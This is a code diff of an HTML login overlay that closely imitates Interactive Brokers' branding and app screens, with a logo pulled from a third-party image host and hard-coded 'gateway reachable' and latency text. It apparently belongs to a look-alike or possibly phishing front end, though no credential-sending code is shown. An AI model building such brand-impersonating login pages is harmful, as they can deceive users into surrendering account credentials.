@@ -28,51 +28,89 @@
 </head>
 <body>
 
-    <!-- IBKR STARTUP / LOGIN OVERLAY -->
+    <!-- IBKR STARTUP / LOGIN OVERLAY — two-step (welcome → login) matching app -->
     <div id="login-screen" class="login-overlay">
-        <div class="login-card">
-            <div class="login-header">
-                <img src="https://i.postimg.cc/BQ3SXy6K/Untitled-(11).png" alt="Interactive Brokers Logo" class="login-logo">
-                <h2><strong>Interactive</strong>Brokers</h2>
-                <p class="login-subtitle">Trader Workstation & WebTrader Login</p>
+        <div class="login-slider">
+            <!-- STEP 1: Welcome / Sign-up screen -->
+            <div class="login-panel login-welcome" id="login-welcome">
+                <button type="button" class="login-menu-dots" aria-label="More"><i class="fa-solid fa-ellipsis"></i></button>
+                <div class="welcome-top">
+                    <img src="https://i.postimg.cc/BQ3SXy6K/Untitled-(11).png" alt="Interactive Brokers" class="welcome-logo">
+                    <h1 class="welcome-brand">Interactive<span>Brokers</span></h1>
+                    <div class="welcome-accent"></div>
+                    <p class="welcome-tagline">Trade stocks, options, futures, currencies,<br>bonds and crypto on 135 global<br>exchanges</p>
+                </div>
+                <div class="welcome-bottom">
+                    <button type="button" class="welcome-btn welcome-btn-primary" id="btn-signup-static">Sign Up</button>
+                    <button type="button" class="welcome-btn welcome-btn-secondary" id="btn-have-account">I Have an Account</button>
+                    <div class="welcome-footer-links">
+                        <a href="#" class="welcome-link">Contact Us</a>
+                        <span class="welcome-sep">|</span>
+                        <a href="#" class="welcome-link">Why IBKR?</a>
+                    </div>
+                </div>
             </div>
-            <form id="login-form" autocomplete="off">
-                <div class="login-field">
-                    <label for="username-input">Username / Account</label>
-                    <div class="input-with-icon">
-                        <i class="fa-solid fa-user"></i>
-                        <input type="text" id="username-input" inputmode="text" enterkeyhint="next" placeholder="DU…" autocomplete="username" autocapitalize="off" autocorrect="off" spellcheck="false">
-                    </div>
-                </div>
-                <div class="login-field">
-                    <label for="password-input">Password / Sensitive Code</label>
-                    <div class="input-with-icon">
-                        <i class="fa-solid fa-lock"></i>
-                        <input type="password" id="password-input" inputmode="text" enterkeyhint="go" placeholder="Enter code" required autocomplete="current-password" autocapitalize="off" autocorrect="off" spellcheck="false">
-                    </div>
-                </div>
-                <div class="login-row-meta">
-                    <label class="login-remember"><input type="checkbox" id="remember-me" checked> Remember this device</label>
-                    <span class="login-forgot">Forgot password?</span>
-                </div>
-                <div id="login-error" class="login-error hidden">
-                    <i class="fa-solid fa-circle-exclamation"></i> No account found. Please try again.
-                </div>
-                <div id="auth-spinner" class="auth-spinner hidden">
-                    <div class="auth-spinner-bar"><div class="auth-spinner-fill"></div></div>
-                    <span>Authenticating…</span>
-                </div>
-                <button type="submit" id="login-btn" class="login-submit-btn">
-                    <span>Log In</span>
-                    <i class="fa-solid fa-arrow-right"></i>
+
+            <!-- STEP 2: Login form screen -->
+            <div class="login-panel login-form-panel" id="login-form-panel">
+                <button type="button" class="login-back-btn" id="login-back-btn" aria-label="Back">
+                    <i class="fa-solid fa-chevron-left"></i>
                 </button>
-            </form>
-            <div class="login-status-strip">
-                <span><span class="conn-dot"></span> Gateway reachable</span>
-                <span id="login-latency">41 ms</span>
-            </div>
-            <div class="login-footer">
-                <i class="fa-solid fa-shield-halved"></i> 256-Bit SSL · Client Portal
+                <button type="button" class="login-menu-dots" aria-label="More"><i class="fa-solid fa-ellipsis"></i></button>
+                <div class="login-form-header">
+                    <img src="https://i.postimg.cc/BQ3SXy6K/Untitled-(11).png" alt="Interactive Brokers" class="login-form-logo">
+                    <h2 class="login-form-brand">Interactive<span>Brokers</span></h2>
+                </div>
+                <form id="login-form" autocomplete="off">
+                    <div class="login-field-app">
+                        <div class="input-with-icon-app">
+                            <i class="fa-regular fa-user"></i>
+                            <input type="text" id="username-input" inputmode="text" enterkeyhint="next" placeholder="Username" autocomplete="username" autocapitalize="off" autocorrect="off" spellcheck="false">
+                        </div>
+                    </div>
+                    <div class="login-field-app">
+                        <div class="input-with-icon-app">
+                            <i class="fa-solid fa-lock"></i>
+                            <input type="password" id="password-input" inputmode="text" enterkeyhint="go" placeholder="Password" required autocomplete="current-password" autocapitalize="off" autocorrect="off" spellcheck="false">
+                            <button type="button" class="pwd-toggle" id="pwd-toggle" aria-label="Show password"><i class="fa-regular fa-eye-slash"></i></button>
+                        </div>
+                    </div>
+                    <div class="login-help-row">
+                        <a href="#" class="login-help-link">Login Help</a>
+                    </div>
+                    <div id="login-error" class="login-error hidden">
+                        <i class="fa-solid fa-circle-exclamation"></i> No account found. Please try again.
+                    </div>
+                    <div id="auth-spinner" class="auth-spinner hidden">
+                        <div class="auth-spinner-bar"><div class="auth-spinner-fill"></div></div>
+                        <span>Authenticating…</span>
+                    </div>
+                    <button type="submit" id="login-btn" class="login-submit-btn-app">Log In</button>
+                </form>
+                <div class="login-extra-rows">
+                    <div class="login-extra-row">
+                        <div class="login-extra-left">
+                            <i class="fa-solid fa-shield-halved"></i>
+                            <span>Register Two-Factor</span>
+                        </div>
+                        <i class="fa-solid fa-chevron-right"></i>
+                    </div>
+                    <div class="login-extra-row">
+                        <div class="login-extra-left">
+                            <i class="fa-solid fa-ban"></i>
+                            <span>Paper Trading</span>
+                        </div>
+                        <label class="paper-toggle">
+                            <input type="checkbox" id="paper-trading-toggle">
+                            <span class="paper-slider"></span>
+                        </label>
+                    </div>
+                </div>
+                <div class="login-form-footer">
+                    <span>Need help?</span> <a href="#" class="login-help-link">Contact Us</a>
+                    <div class="login-version">Version 10.18.2.5366</div>
+                    <div class="login-shield"><i class="fa-solid fa-shield-halved"></i></div>
+                </div>
             </div>
         </div>
     </div>
